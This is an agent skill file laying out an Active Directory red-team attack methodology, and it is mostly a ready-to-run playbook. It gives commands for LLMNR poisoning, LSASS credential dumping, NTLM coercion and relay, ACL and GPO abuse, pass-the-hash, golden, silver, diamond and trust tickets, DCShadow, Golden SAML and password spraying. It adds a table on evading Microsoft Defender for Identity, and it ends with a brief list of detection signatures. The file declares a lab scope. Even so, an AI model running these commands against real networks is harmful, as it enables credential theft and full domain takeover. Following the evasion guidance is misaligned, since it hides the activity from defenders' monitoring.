---
name: ad-attack-methodology
description: "Active Directory attack methodology for internal red team engagements — recon via BloodHound, credential harvesting (LLMNR/NBT-NS poisoning, NTLM relay, LSASS/SAM), privilege escalation (ACL abuse, Kerberos delegation, coercion primitives, GPO abuse), persistence (Golden/Silver/Diamond/Sapphire tickets, DCShadow, AdminSDHolder), forest trust attacks, hybrid AD/Entra ID pivots (AAD Connect, Seamless SSO, PTA, PHS, Golden SAML, Pass-the-PRT), and MDI/Defender for Identity evasion. Dedicated sub-skills cover BloodHound/BHCE, Kerberoasting, AS-REP roasting, ADCS abuse, DCSync, LAPS, coercion, NTLM relay, NetExec — this file is the routing entry + the attack surface not covered there."
allowed-tools: Bash Read Write
metadata:
  subdomain: active-directory
  when_to_use: "active directory ad attack methodology overview routing acl abuse delegation coercion gpo forest trust hybrid entra id mdi evasion credential harvesting persistence golden ticket silver ticket diamond sapphire dcshadow adminsdholder"
  mitre_attack:
    - T1078.002
    - T1558.003
    - T1558.004
    - T1003.006
    - T1649
    - T1555
    - T1557.001
    - T1187
    - T1550.002
    - T1550.003
    - T1087.002
    - T1482
    - T1134.001
    - T1548.002
  capability_contract:
    lane: active-directory
    scope: isolated-lab
    environment: [resettable-ad-lab, isolated-network]
    required_tools: [bloodhound-ce, certipy, netexec]
    evidence: [attack-path-query, lab-replay, remediation-check]
    verification: "replay the exact path in a freshly reset authorized lab"
    negative_control: "confirm the path fails after the remediated control is applied"
    scorecard: [verified-path-rate, noisy-action-rate, remediation-correctness]
    benchmark: dreadgoad
---

# AD Attack Methodology

Active Directory attack methodology for internal red team engagements: map the domain with BloodHound, harvest credentials, escalate within AD via ACL/delegation/coercion abuse, persist with ticket forgery or directory modification, and pivot into hybrid Entra ID. This file is the routing entry into the AD sub-skills plus the attack surface they do not cover. All techniques require prior domain access (compromised user or machine account).

## Sub-skill Routing

| Skill | Use for |
|---|---|
| `/skills/standard/ad/bloodhound/SKILL.md`  | Operate BloodHound CE via `bhce_*` tools, SharpHound/bloodhound-python collection, canonical Cypher queries (merged collection + query playbooks) |
| `/skills/standard/ad/kerberoasting/SKILL.md`    | Roast SPN users, crack with hashcat |
| `/skills/standard/ad/asrep-roasting/SKILL.md`   | dontreqpreauth users |
| `/skills/standard/ad/adcs-abuse/SKILL.md`        | ADCS ESC1-ESC15 exploitation via Certipy — find vulnerable templates, request cert, authenticate as target, DCSync krbtgt |
| `/skills/standard/ad/coercer/SKILL.md`          | PetitPotam / PrinterBug / DFSCoerce / ShadowCoerce — force NTLM auth, then relay |
| `/skills/standard/ad/dcsync/SKILL.md`           | Replication rights → krbtgt dump |
| `/skills/standard/ad/laps/SKILL.md`             | LAPS local admin password extraction |
| `/skills/standard/ad/netexec/SKILL.md`          | NetExec (formerly CrackMapExec) cheatsheet — SMB/WinRM/LDAP/MSSQL modules |
| `/skills/standard/ad/ntlm-relay/SKILL.md`       | `ntlmrelayx` target-selection matrix, SMB-signing bypass, multi-relay |

## MITRE ATT&CK Mapping

| Technique | ID | Where covered |
|---|---|---|
| Valid Accounts: Domain Accounts | T1078.002 | Throughout — ADCS auth, DCSync, lateral movement |
| Kerberoasting | T1558.003 | `kerberoasting.md` |
| AS-REP Roasting | T1558.004 | `asrep-roasting.md` |
| DCSync | T1003.006 | `dcsync.md` |
| Steal or Forge Authentication Certificates | T1649 | `adcs-abuse.md` |
| Credentials from Password Stores | T1555 | `laps.md` |
| LLMNR/NBT-NS Poisoning and SMB Relay | T1557.001 | Credential Harvesting (here) + `ntlm-relay.md` |
| Forced Authentication | T1187 | `coercer.md` |
| Pass the Hash | T1550.002 | Lateral Movement (here) + `ntlm-relay.md` |
| Pass the Ticket | T1550.003 | Lateral Movement / Persistence (here) |
| Domain Account Discovery | T1087.002 | `bloodhound.md` |
| Domain Trust Discovery | T1482 | Forest & Trust Attacks (here) + `bloodhound.md` |
| Token Impersonation/Theft | T1134.001 | Host-level — `windows-privesc.md` |
| Bypass UAC | T1548.002 | Host-level — `windows-privesc.md` |

## Workflow

1. Collect: `bash("bloodhound-python -u user -p pass -d DOMAIN -c all --zip")`
2. `bhce_ingest_zip("/workspace/bh.zip")` (against the BHCE server)
3. `dcsync_check` — if any principal, that's instant domain compromise
4. `bhce_cypher("MATCH (u:User {hasspn:true}) RETURN u.name")` → Kerberoast queue
5. `bhce_cypher("MATCH (u:User {dontreqpreauth:true}) RETURN u.name")` → AS-REP roast
6. ADCS: `bash("certipy find -u user -p pass -dc-ip X -json")` then `adcs_audit`
7. Domain compromise paths: shortestPath Cypher via `bhce_cypher` (see the bloodhound playbook)

## Crown Jewels to Record

```
kg_record('[
  {"kind": "CrownJewel", "key": "crown-jewel::domain-admins", "label": "Domain Admins group"},
  {"kind": "CrownJewel", "key": "crown-jewel::krbtgt", "label": "krbtgt account"},
  {"kind": "CrownJewel", "key": "crown-jewel::dc-dc01", "label": "DC: DC01.corp.local"}
]')
```

## Reconnaissance

For detailed BloodHound collection, BHCE server ops, and canonical Cypher queries, see `bloodhound.md`. For protocol-level sweeps (SMB/LDAP/WinRM auth, spraying, relay-list generation), see `netexec.md`.

### PowerView (No Tool Drop)

```powershell
# Domain enumeration without binaries
$d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
Get-DomainComputer -Unconstrained
Get-DomainGPO | ?{$_.gpcmachineextensionnames -match "Restricted Groups"}
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |
  ?{$_.ActiveDirectoryRights -match 'WriteDacl|GenericAll|WriteOwner'}
```

### ADExplorer Offline

```
# Take snapshot from any low-priv user, analyze offline
ADExplorer.exe → File → Create Snapshot
# Convert to BloodHound format
ADExplorerSnapshot.py snapshot.dat -o output/
```

## Credential Harvesting

### LLMNR / NBT-NS / mDNS Poisoning

```bash
# Capture NetNTLMv2 hashes from broadcast resolution
responder -I eth0 -wrf

# Inveigh (Windows-side, when you have a foothold)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTP Y
```

Crack with hashcat mode 5600. If cracking fails, relay instead.

### NTLM Relay

For the full `ntlmrelayx` target-selection matrix, SMB-signing constraints, and multi-relay patterns, see `ntlm-relay.md`. Coercion primitives that feed the relay live in `coercer.md`.

### Kerberoasting

For the full Kerberoast workflow (enum + request + crack + promote), see `kerberoasting.md`.

### AS-REP Roasting

For the full zero-auth AS-REP workflow, see `asrep-roasting.md`.

### LAPS

For detection of LAPS deployment, over-delegated readers, and password extraction, see `laps.md`.

### LSASS / SAM Dumping

```cmd
:: Modern, AV-friendly: comsvcs.dll minidump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\out.dmp full

:: Task Manager → lsass.exe → Create dump file (GUI route, no binary drop)

:: nanodump (handle duplication, no MiniDumpWriteDump)
nanodump.exe --pid <PID> -w lsass.dmp --valid
```

Parse with Mimikatz or pypykatz offline:

```bash
pypykatz lsa minidump lsass.dmp
```

## Privilege Escalation Within AD

### ACL Abuse

| Right | Abuse |
|-------|-------|
| `GenericAll` / `GenericWrite` | Add SPN → Kerberoast; reset password; add member |
| `WriteDacl` | Grant yourself DCSync rights, then DCSync |
| `WriteOwner` | Take ownership → grant rights → exploit |
| `AllExtendedRights` (User) | Force password change |
| `AllExtendedRights` (Domain) | DCSync |
| `AddMember` | Add self to privileged group |
| `WriteSPN` | Set SPN, kerberoast target |

```powershell
# Targeted Kerberoast (write SPN, roast, remove SPN)
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/SPN'}
Rubeus.exe kerberoast /user:victim
Set-DomainObject -Identity victim -Clear serviceprincipalname

# Grant DCSync via WriteDacl
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \
  -PrincipalIdentity attacker -Rights DCSync
```

### Kerberos Delegation

```powershell
# Find delegation
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Unconstrained → wait for / coerce DC auth, capture TGT
Rubeus.exe monitor /interval:5 /nowrap

# Constrained (S4U2self/S4U2proxy) — impersonate any user to allowed SPN
Rubeus.exe s4u /user:svc_acct /rc4:<hash> /impersonateuser:Administrator \
  /msdsspn:cifs/dc.corp.local /ptt

# Resource-Based Constrained Delegation (RBCD) — write msDS-AllowedToActOnBehalfOfOtherIdentity
# Requires GenericAll/GenericWrite on the target computer object
```

### Coercion Primitives

For the full coercion workflow (listener setup, Coercer meta-tool, relay chaining), see `coercer.md`.

| Technique | Tool / RPC |
|-----------|-----------|
| PetitPotam | `MS-EFSRPC` (`EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv`) |
| PrinterBug | `MS-RPRN` (`RpcRemoteFindFirstPrinterChangeNotificationEx`) |
| DFSCoerce | `MS-DFSNM` (`NetrDfsRemoveStdRoot`) |
| ShadowCoerce | `MS-FSRVP` |
| WebDAV | Search-and-replace UNC path embedded in any web fetch |

```bash
# Coerce + relay full chain
impacket-ntlmrelayx -t ldap://dc -smb2support --delegate-access &
PetitPotam.py -u low -p pass attacker-ip dc-ip
# Result: RBCD set, S4U → DA on coerced machine
```

### GPO Abuse

```powershell
# Find GPOs you can edit
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |
  ?{ $_.SecurityIdentifier -eq (Get-DomainUser current).objectsid `
     -and $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl' }

# SharpGPOAbuse — add scheduled task / immediate task to GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName Update --Author NT\System \
  --Command cmd.exe --Arguments "/c net group 'Domain Admins' attacker /add /domain" \
  --GPOName "Workstation Policy"
```

## ADCS Abuse

For the full ESC1-ESC15 catalog, exploitation chains, and OPSEC, see `adcs-abuse.md`. Quick orientation: `certipy find -vulnerable` locates misconfigured templates; ESC1 (enrollee supplies subject) is the most common path to instant DA; ESC8 relays coerced NTLM auth into Web Enrollment for a DC cert.

## Lateral Movement

### Pass-the-Hash / Overpass-the-Hash

```bash
# PTH with NT hash
nxc smb 10.0.0.0/24 -u admin -H <NThash> --local-auth
impacket-psexec corp/admin@target -hashes :<NThash>

# Overpass-the-Hash (NT hash → TGT, useful for Kerberos-only targets)
Rubeus.exe asktgt /user:admin /rc4:<NThash> /ptt
```

### Pass-the-Ticket

```powershell
# Inject TGT
Rubeus.exe ptt /ticket:base64.kirbi
# Or from .ccache
KRB5CCNAME=admin.ccache impacket-secretsdump -k -no-pass dc.corp.local
```

### Silent Lateral Tools

```bash
# WinRM (no event logs in default channel for command exec)
evil-winrm -i target -u admin -H <hash>

# SMB exec without service creation (uses task scheduler)
impacket-atexec corp/admin@target -hashes :<hash> "whoami"

# WMI
impacket-wmiexec corp/admin@target -hashes :<hash>

# DCOM (MMC20.Application, ShellWindows, ShellBrowserWindow)
Invoke-DCOM -ComputerName target -Method MMC20 -Command "calc.exe"
```

## Persistence

### Golden Ticket (krbtgt forge)

```bash
# Requires krbtgt NT hash (from DCSync — see dcsync.md)
impacket-ticketer -nthash <krbtgt-NT> -domain-sid S-1-5-21-... -domain corp.local Administrator
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass dc.corp.local
```

```powershell
# Mimikatz variant — with specific groups (Domain Admins=512, Enterprise Admins=519, Schema Admins=518)
mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NT_HASH> /groups:512,519,518 /ptt
```

### Silver Ticket (per-service forge)

```bash
# Forge TGS for a specific service using its account hash
impacket-ticketer -nthash <svc-NT> -domain-sid <SID> -domain corp.local \
  -spn cifs/server.corp.local Administrator
```

### Diamond / Sapphire Ticket (modern, evades MDI on krbtgt)

```bash
# Diamond — modify legitimate TGT in-flight (no krbtgt hash on wire)
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512
```

### DCShadow (register rogue DC, push changes)

```
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:CN=victim,... /attribute:primaryGroupID /value:519
mimikatz # lsadump::dcshadow /push
```

### AdminSDHolder

Add ACE granting your account `GenericAll` on `CN=AdminSDHolder,CN=System,DC=corp,DC=local`. SDProp propagates to all protected groups every 60 minutes.

### DCSync

For the full DCSync workflow (rights enumeration, secretsdump variants, output files, promote schema), see `dcsync.md`.

## Forest & Trust Attacks

```powershell
# Map trusts
Get-DomainTrust -SearchBase "DC=corp,DC=local"
Get-ForestTrust

# SID History injection (cross-forest if SID filtering disabled)
# ExtraSids in golden ticket → admin in trusted forest
impacket-ticketer -nthash <krbtgt> -domain-sid <child-SID> \
  -extra-sid S-1-5-21-<parent>-519 -domain child.corp.local Administrator

# Trust ticket forging (inter-realm TGT)
Rubeus.exe asktgs /service:krbtgt/parent.local /ticket:trust-ticket.kirbi
```

## Hybrid AD / Entra ID (Azure AD) Pivots

| Pivot | Path |
|-------|------|
| AAD Connect server compromise | Dump MSOL_ account → DCSync on-prem |
| Seamless SSO | Forge Kerberos ticket for `AZUREADSSOACC$` → cloud SSO any user |
| PTA agent | DLL hijack `Microsoft.Azure.SecurityTokenService` → harvest cleartext |
| PHS hash sync | Read on-prem hashes from AAD Connect SQL (ADSync DB) |
| Federated trust | Forge SAML token via stolen ADFS token-signing cert (Golden SAML) |
| Pass-the-PRT | Steal PRT cookie from device → cloud session as user |

```powershell
# AADInternals — Hybrid identity attack toolkit
Get-AADIntADSyncCredentials  # Extract MSOL_ creds from AAD Connect
Open-AADIntOffice365Portal -AccessToken $token
New-AADIntSAMLToken -ImmutableID 'a==' -Issuer 'http://sts/adfs/services/trust' \
  -PfxFileName 'token-signing.pfx'
```

## Detection Evasion (MDI / Defender for Identity)

For relay-related evasion trade-offs (source-vs-destination heuristics, cross-protocol bypasses), see `ntlm-relay.md`.

| MDI Detector | Evasion |
|--------------|---------|
| Honeytoken account access | Always check `description` and recent activity before hitting accounts |
| Reconnaissance via SAMR | Use ADWS / LDAP-only collection, throttle |
| Suspicious Kerberos delegation | Avoid noisy `S4U2self` chains on monitored DCs |
| Golden/Silver Ticket detection | Use Diamond/Sapphire variants; match legitimate ticket lifetime/encryption |
| DCSync from non-DC | Relay through legitimate replication-permitted accounts |
| Pass-the-Hash | Use overpass-the-hash to convert to Kerberos before lateraling |

```powershell
# Identify MDI sensors before noisy actions
Get-DomainComputer -SPN '*MicrosoftATA*'
Get-DomainComputer | ?{ $_.servicePrincipalName -match 'AATPSensor' }
```

## Detection Signatures

| Event ID | Source | Indicator | Technique |
|----------|--------|-----------|-----------|
| 4769 | Security | TGS requested with RC4 encryption (0x17) | Kerberoasting |
| 4768 | Security | AS-REQ without pre-authentication | AS-REP Roasting |
| 4662 | Security | Replication rights accessed on domain object | DCSync |
| 4624 | Security | Logon with forged ticket (anomalous SID/groups) | Golden Ticket |
| 5136 | Security | Directory Service object modification | Delegation abuse |
| 4769 | Security | TGS for sensitive service by unusual account | Constrained Delegation |
| 4886 | Security | Certificate Services received certificate request | AD CS abuse |
| 4887 | Security | Certificate Services approved certificate request | AD CS abuse |

### Behavioral Indicators
- Sudden spike in TGS requests from a single account (Kerberoasting)
- AS-REQ for accounts that normally use pre-auth (AS-REP Roasting)
- Replication traffic from non-DC IP addresses (DCSync)
- TGT with abnormal lifetime or group memberships (Golden Ticket)
- S4U2self/S4U2proxy requests from unexpected accounts (Delegation abuse)
- Certificate requests with SAN different from requesting user (AD CS ESC1)

## Engagement Cheatsheet

```bash
# 1. Anonymous LDAP enum (no creds)
ldapsearch -x -H ldap://dc -s base -b "" "(objectclass=*)"
nxc ldap dc -u '' -p '' --users

# 2. Null SMB session
nxc smb dc -u '' -p '' --shares
impacket-rpcclient -U '' dc -no-pass

# 3. Password spray (low and slow)
nxc smb dc -u users.txt -p 'Winter2025!' --continue-on-success

# 4. Once authed: full enum + BloodHound
bloodhound-python -d corp.local -u user -p pass -ns dc -c All --zip

# 5. Identify attack path → execute → loot → persist
```

Full command-level workflows per protocol: see `netexec.md`.

## Decision Gate

```
AD Exploitation successful?
├── YES → Credentials obtained
│   ├── Service account cracked → Lateral Movement (use creds to pivot)
│   ├── Domain Admin hash → DCSync → Full domain compromise
│   ├── krbtgt hash → Golden Ticket → Persistence
│   ├── Certificate obtained → PKINIT auth → Privilege Escalation
│   └── Delegation abused → Service impersonation → Lateral Movement
└── NO → Reassess
    ├── No Kerberoastable SPNs → Enumerate other attack paths (ACL abuse, GPO)
    ├── Hashes not cracking → Expand wordlists, try rules, check for AES-only
    ├── No vulnerable templates → Check ESC2-ESC8, other AD CS vectors
    ├── Insufficient rights for DCSync → Escalate via ACL abuse or delegation
    └── No delegation found → Check resource-based constrained delegation (RBCD)
```

## Key References

- SpecterOps "Certified Pre-Owned" (Schroeder, Christensen) — ADCS ESC1-ESC8
- BloodHound: https://bloodhound.specterops.io
- Coercer: https://github.com/p0dalirius/Coercer (unified coercion toolkit)
- Source checklist: https://github.com/SnailSploit/offensive-checklist/blob/main/active-directory.md
- MITRE ATT&CK: TA0006 (Credential Access), TA0008 (Lateral Movement), T1558 (Steal/Forge Kerberos)
